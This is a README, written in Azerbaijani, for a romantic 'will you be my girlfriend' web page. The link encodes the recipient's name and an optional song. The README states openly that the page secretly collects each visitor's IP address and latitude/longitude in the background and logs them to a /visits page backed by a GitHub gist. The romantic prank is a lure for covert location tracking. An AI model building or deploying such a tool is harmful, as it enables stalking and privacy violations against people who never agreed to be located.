# Lover

Romantik “Mənimlə sevgili olarsan?” tətbiqi.

## Link

Adı UTF-8 Base64 ilə encode edib URL path-ə əlavə et:

```text
https://YOUR_DOMAIN/<base64(ad)>
```

Nümunə (`Səbinə` + YouTube mahnı):

```text
https://YOUR_DOMAIN/U8mZYmluyZk%3D?yt=https://www.youtube.com/watch?v=VIDEO_ID
```

və ya qısa:

```text
https://YOUR_DOMAIN/U8mZYmluyZk%3D?yt=VIDEO_ID
```

Musiqi üçün bir toxunuş lazımdır (brauzer autoplay qaydası). Toxunandan sonra mahnı arxa planda oxuyur.

## Əməliyyat

- **Hə** — qəbul mesajı
- **Yox** — desktop-da mousedan qaçır; telefondə klik/toxunuşda cəld yer dəyişir
- Arxa planda IP + latitude/longitude gizli toplanır

## Visits

Ziyarət logları:

```text
https://YOUR_DOMAIN/visits
```

## Lokal işə salma

```bash
npm install
npm run dev
```

Env:

```bash
GH_TOKEN=...
VISITS_GIST_ID=...
```
